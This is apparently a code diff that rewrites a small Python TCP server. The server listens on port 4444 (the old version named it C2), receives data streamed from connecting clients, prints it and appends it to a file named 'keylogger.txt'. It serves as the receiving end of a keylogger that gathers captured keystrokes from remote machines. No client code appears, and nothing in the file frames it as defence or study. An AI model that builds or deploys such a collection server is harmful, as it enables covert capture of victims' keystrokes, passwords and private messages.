@@ -1,55 +1,80 @@
 import socket
-import os
 import threading
+import sys
+import os
 
 class Server():
-
-    def __init__(self, Server, Port):
-
-        self.__Server = Server
-        self.__Port = Port 
-
-    def handle_client(self, conn, addr):
-
-        print(f"Connected from {addr[0]}:{addr[1]}")
-
-        with conn:
-
-            while True:
-
-                data = conn.recv(1024).decode('utf-8')
-
-                with open("keylogger.txt", 'a') as f:
-                    
-                    f.write(data)
-
-                if not data:
-
-                    break
-
-        print(f"Client: {addr[0]} has disconnected")
+  
+   def __init__(self, Host, Port):
     
-    def start_server(self):
+     self.__Host = Host
+     self.__Port = Port
 
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            
-            s.bind((self.__Server, self.__Port))
-            s.listen(3)
-            
-            print(f"Server listening on {self.__Server}:{self.__Port}")
-            print("Listening for connection...")
+   def handle_client(self, conn, addr):
+
+      print(f"Connected from {addr[0]}:{addr[1]}")
+
+      try: 
+            while True:
+
+               data = conn.recv(1024)
+               
+               decode_msg = data.decode('utf-8')
+
+               print(f"{decode_msg}", end='')
+
+               with open("keylogger.txt", 'a') as f:
+
+                  f.write(decode_msg)
+
+               if not data:
+
+                  print(f"Client {addr[0]} has disconnected")
+                  break 
+
+      except Exception as e:
+
+         print(f"{addr[0]} has disconnected, due to {e}")
+         
+      finally:
+
+         conn.close()
+         
+
+   def start_server(self):
+     
+      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+         Adress = (self.__Host, self.__Port)
+         s.bind(Adress)
+         s.listen()
+         print(f"Server is listening on {self.__Host}:{self.__Port}")
+         print("Listening for connection...")
+         try:
 
             while True:
 
-                conn, addr = s.accept()
-                client_thread = threading.Thread(target=self.handle_client, args=(conn,addr))
-                client_thread.start()
+               conn, addr = s.accept()
 
+               handle_client = threading.Thread(target=self.handle_client, args=(conn,addr))
+               handle_client.start()
+            
+         except KeyboardInterrupt:
+
+            print("Server is shutting down!!!")
+         
+         finally: 
+            
+            s.close()
+            print("Socket closed.")
+            sys.exit(0)
 
 if __name__ == '__main__':
+  
+  os.system('neofetch')  
+  Host = "0.0.0.0"
+  Port = 4444
+  server = Server(Host, Port)
 
-    Host = socket.gethostbyname(socket.gethostname())
-    Port = 4444
+  server.start_server()
+  
 
-    C2 = Server(Host, Port)
-    C2.start_server()
